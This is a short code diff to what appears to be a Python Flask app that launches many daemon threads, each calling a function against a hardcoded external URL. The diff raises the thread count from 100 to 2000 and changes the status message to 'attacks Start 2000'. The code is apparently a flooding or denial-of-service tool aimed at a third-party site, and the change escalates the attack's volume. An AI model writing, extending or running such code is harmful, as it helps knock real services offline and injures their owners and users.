@@ -51,14 +51,14 @@ def chek(url):
 
 def start_threads():
     target_url = "http://23.x10.mx/public/"
-    for _ in range(100):
+    for _ in range(2000):
         thread = threading.Thread(target=chek, args=(target_url,))
         thread.daemon = True
         thread.start()
 
 @app.route('/')
 def home():
-    return "attacks Start"
+    return "attacks Start 2000 "
 
 if __name__ == '__main__':
     threading.Thread(target=start_threads, daemon=True).start()
